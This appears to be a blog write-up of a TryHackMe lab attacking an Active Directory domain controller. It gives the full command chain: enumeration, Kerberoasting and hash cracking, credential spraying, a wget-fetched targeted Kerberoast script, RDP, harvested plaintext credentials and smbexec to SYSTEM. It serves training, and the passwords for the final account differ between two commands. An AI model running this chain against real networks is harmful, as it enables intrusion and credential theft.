@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Operation Endgame | Jenn Shagrin</title>
+<meta name="description" content="TryHackMe CTF — Active Directory attack chain. RustScan, NetExec, Kerberoasting, credential spray, Bloodhound, targeted Kerberoast, RDP, plaintext credentials in PowerShell script, smbexec to SYSTEM.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/operation-endgame.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/operation-endgame.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Operation Endgame">
+<meta property="og:description" content="Active Directory attack chain. Kerberoasting, credential spray, Bloodhound, targeted Kerberoast, plaintext creds in PS script, smbexec to SYSTEM.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Operation Endgame">
+<meta name="twitter:description" content="Active Directory attack chain. Kerberoasting, credential spray, Bloodhound, targeted Kerberoast, plaintext creds in PS script, smbexec to SYSTEM.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Operation Endgame</h1>
+    <div class="post-description">TryHackMe CTF &mdash; Active Directory domain controller. RustScan enumeration, LDAP null session, Kerberoasting, credential spray, Bloodhound, targeted Kerberoast, plaintext credentials in a PowerShell script, and smbexec to SYSTEM.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Windows Server 2019. Domain: <code>thm.local</code>. Hostname: <code>AD</code>. The CA name <code>thm-LABYRINTH-CA</code> suggested ADCS in play from the first scan. My little ethical hacker heart was all aflutter — again.</p>
+
+<hr>
+
+<h2>Initial Enumeration</h2>
+
+<p>Started with RustScan while dirsearch ran in parallel:</p>
+
+<pre><code>rustscan -r 1-65535 -a 10.146.178.66 -- -sV -sC -T4
+dirsearch -u http://10.146.178.66</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.54.56 AM.png" alt="dirsearch results showing 403 on /aspnet_client/" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.59.03 AM.png" alt="dirsearch sleuthing while RustScan runs" style="max-width:100%;margin:1rem 0;">
+
+<p>RustScan completed. Classic AD port cluster confirmed — 53, 88, 135/139/445, 389/636, 3268/3269, 464, 593. RDP open on 3389. WinRM on 47001. SMB signing enforced, which rules out relay attacks.</p>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.54.24 AM.png" alt="RustScan results showing full AD port cluster" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.54.56 AM.png" alt="Domain info — thm.local, ad.thm.local, Windows Server 2019" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.55.17 AM.png" alt="ADCS confirmed via thm-LABYRINTH-CA certificate" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.55.54 AM.png" alt="RDP on 3389 and WinRM on 47001 confirmed" style="max-width:100%;margin:1rem 0;">
+
+<p>Added both <code>ad.thm.local</code> and <code>thm.local</code> to <code>/etc/hosts</code>.</p>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 12.23.48 PM.png" alt="/etc/hosts updated with thm.local and ad.thm.local" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>SMB Enumeration — NetExec</h2>
+
+<pre><code>nxc smb 10.146.146.34 -u 'anonymous' -p '' --shares</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 11.21.03 AM.png" alt="NetExec anonymous SMB enumeration" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 11.23.42 AM.png" alt="Additional nxc SMB checks" style="max-width:100%;margin:1rem 0;">
+
+<p>Switched to guest auth against the hostname:</p>
+
+<pre><code>nxc smb ad.thm.local -u 'guest' -p '' --shares</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 8.47.18 PM.png" alt="NetExec nxcdb shell — hosts, creds, groups queries" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 8.56.07 PM.png" alt="Guest auth confirming IPC$ READ access" style="max-width:100%;margin:1rem 0;">
+
+<p>IPC$ with READ access. Guest auth with no password. The DC was willing to give up its user list without credentials.</p>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.03.30 PM.png" alt="nxc user and group queries returning domain information" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>LDAP Null Session — Group Enumeration</h2>
+
+<pre><code>nxc ldap ad.thm.local -u 'guest' -p ''
+nxc ldap ad.thm.local -u 'guest' -p '' --groups</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.06.09 PM.png" alt="LDAP null session confirmed" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.13.02 PM.png" alt="LDAP group enumeration — Remote Desktop Users 6 members, Remote Management Users 3 members" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.13.42 PM.png" alt="Certificate Service DCOM Access, Cert Publishers, Group Policy Creator Owners, Reader Admins" style="max-width:100%;margin:1rem 0;">
+
+<p>Groups worth noting: <code>Remote Desktop Users</code> had 6 members — multiple RDP paths. <code>Remote Management Users</code> had 3 members with WinRM access on an open port. <code>Certificate Service DCOM Access</code> and <code>Cert Publishers</code> confirmed ADCS. <code>Group Policy Creator Owners</code> — one member who can modify GPOs domain-wide. <code>Reader Admins</code> — custom group, no description, suspicious by definition.</p>
+
+<hr>
+
+<h2>Kerberoasting — CODY_ROY</h2>
+
+<pre><code>nxc ldap ad.thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.21.59 PM.png" alt="Kerberoasting via LDAP null session — CODY_ROY RC4 hash returned" style="max-width:100%;margin:1rem 0;">
+
+<p>Full RC4 hash for <code>CODY_ROY</code>. Thanks for the keyboard walk, Cody.</p>
+
+<pre><code>john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.27.32 PM.png" alt="John cracking CODY_ROY hash — MKO)mko0" style="max-width:100%;margin:1rem 0;">
+
+<p>Recovered: <code>MKO)mko0</code></p>
+
+<hr>
+
+<h2>User Enumeration — Passwords in Description Fields</h2>
+
+<pre><code>nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users</code></pre>
+
+<p>Built a username list. Three accounts had passwords sitting in their description fields: <code>IVY_WILLIS</code> and <code>SUSANNA_MCKNIGHT</code> with <code>CHANGEME2023!</code>, and <code>MARGARITO_HAMILTON</code> with <code>MARGARITO_RESET_ASAP</code>. Classic AD misconfiguration.</p>
+
+<p><code>ZACHARY_HUNT</code> had <code>BadPW: 0</code> and a manually-set password timestamp matching Administrator and krbtgt. That anomaly set off every instinct I had.</p>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.53.14 PM.png" alt="nxc user enumeration showing description field passwords" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 9.54.39 PM.png" alt="ZACHARY_HUNT BadPW: 0 and manual password timestamp flagged" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Credential Spray — ZACHARY_HUNT</h2>
+
+<p>Hypothesis: ZACHARY_HUNT's password matched CODY_ROY's. Same admin, same lazy reuse.</p>
+
+<pre><code>nxc smb ad.thm.local -u 'ZACHARY_HUNT' -p 'MKO)mko0'</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.00.37 PM.png" alt="ZACHARY_HUNT credential confirmed — MKO)mko0 works" style="max-width:100%;margin:1rem 0;">
+
+<p>I wish my wife told me I was right as often as my instincts do.</p>
+
+<pre><code>nxc ldap ad.thm.local -u 'ZACHARY_HUNT' -p 'MKO)mko0' --groups</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.07.46 PM.png" alt="ZACHARY_HUNT group membership — Domain Admins confirmed" style="max-width:100%;margin:1rem 0;">
+
+<p>Domain Admin. Moving.</p>
+
+<hr>
+
+<h2>RDP as ZACHARY_HUNT</h2>
+
+<pre><code>xfreerdp /u:ZACHARY_HUNT /p:'MKO)mko0' /v:ad.thm.local</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.13.37 PM.png" alt="RDP session open as ZACHARY_HUNT" style="max-width:100%;margin:1rem 0;">
+
+<p>GUI permission errors. Win+R bypasses them.</p>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.18.24 PM.png" alt="Win+R bypassing GUI permission errors" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.20.17 PM.png" alt="runas /user:THM\\Administrator cmd hitting dead ends" style="max-width:100%;margin:1rem 0;">
+
+<p>Hitting dead ends trying to impersonate Administrator directly. Pivoted to a broader credential spray with the full user list:</p>
+
+<pre><code>nxc smb ad.thm.local -u users.txt -p 'MKO)mko0' --continue-on-success</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.36.33 PM.png" alt="Credential spray — CODY_ROY confirmed no elevated access" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.38.11 PM.png" alt="ZACHARY_HUNT confirmed Domain Admin in spray results" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Bloodhound + Targeted Kerberoast — JERRI_LANCASTER</h2>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.40.27 PM.png" alt="Bloodhound showing Kerberoastable path to JERRI_LANCASTER" style="max-width:100%;margin:1rem 0;">
+
+<p>Bloodhound confirmed the path. Downloaded targetedKerberoast.py and ran it as ZACHARY_HUNT:</p>
+
+<pre><code>wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/main/targetedKerberoast.py
+python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-host ad.thm.local --request-user JERRI_LANCASTER</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.47.35 PM.png" alt="targetedKerberoast.py returning JERRI_LANCASTER TGS hash" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>john jerri.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.52.24 PM.png" alt="John cracking JERRI_LANCASTER hash — lovinlife!" style="max-width:100%;margin:1rem 0;">
+
+<p>Recovered: <code>lovinlife!</code></p>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.52.59 PM.png" alt="Bloodhound updated — full attack path now visible" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>RDP as JERRI_LANCASTER</h2>
+
+<pre><code>xfreerdp /v:ad.thm.local /u:'jerri_lancaster' /p:'lovinlife!' /dynamic-resolution /clipboard /cert:ignore</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.58.12 PM.png" alt="RDP session open as JERRI_LANCASTER" style="max-width:100%;margin:1rem 0;">
+
+<p>Nice password, Jerri. Win+R again for the permission errors. Found <code>C:\Scripts\syncer.ps1</code>.</p>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 10.59.51 PM.png" alt="C:\\Scripts\\syncer.ps1 discovered" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 11.01.45 PM.png" alt="syncer.ps1 containing SANFORD_DAUGHERTY credentials in plaintext" style="max-width:100%;margin:1rem 0;">
+
+<p>Plaintext credentials for <code>SANFORD_DAUGHERTY</code> sitting in a PowerShell sync script. Thanks, Jerri and Sanford. Hope that office romance is worth it.</p>
+
+<hr>
+
+<h2>Final Access — smbexec as SANFORD_DAUGHERTY</h2>
+
+<pre><code>nxc smb ad.thm.local -u 'sanford_daugherty' -p 'RESETASAP123'</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 11.05.04 PM.png" alt="SANFORD_DAUGHERTY credentials confirmed via nxc" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>python3 smbexec.py 'THM.LOCAL/SANFORD_DAUGHERTY:RESET_ASAP123@ad.thm.local'</code></pre>
+
+<img src="/images/operation-endgame/Screenshot 2026-04-06 at 11.15.29 PM.png" alt="smbexec shell as SANFORD_DAUGHERTY — flag retrieved" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}</code></pre>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>RustScan → Windows Server 2019 AD DC, thm.local, ADCS via thm-LABYRINTH-CA
+→ NetExec guest auth → IPC$ READ, LDAP null session open
+→ LDAP group enumeration → Kerberoastable accounts identified
+→ Kerberoast CODY_ROY → MKO)mko0
+→ User enumeration → passwords in description fields + ZACHARY_HUNT anomaly
+→ Credential spray → ZACHARY_HUNT = Domain Admin, same password
+→ RDP as ZACHARY_HUNT → Bloodhound → targeted Kerberoast JERRI_LANCASTER
+→ john → lovinlife!
+→ RDP as JERRI_LANCASTER → C:\Scripts\syncer.ps1 → SANFORD_DAUGHERTY plaintext creds
+→ nxc confirms → smbexec → flag</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
